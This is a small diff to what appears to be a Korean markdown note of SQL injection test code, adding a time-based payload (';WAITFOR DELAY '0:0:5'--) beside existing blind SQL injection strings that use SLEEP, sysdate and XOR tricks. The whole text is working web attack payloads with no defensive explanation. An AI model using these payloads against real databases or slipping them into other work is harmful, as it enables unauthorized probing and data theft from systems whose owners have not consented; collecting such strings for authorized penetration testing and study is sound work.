@@ -22,6 +22,10 @@ SqIinjection 테스트 코드
 'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
 ```
 
+```
+';WAITFOR DELAY '0:0:5'--
+```
+
 테스트
 ```
 '||(SELECT 0x615a636e FROM DUAL WHERE 7192=7192 AND (SELECT 4865 FROM (SELECT(SLEEP(5)))VDbe))||'
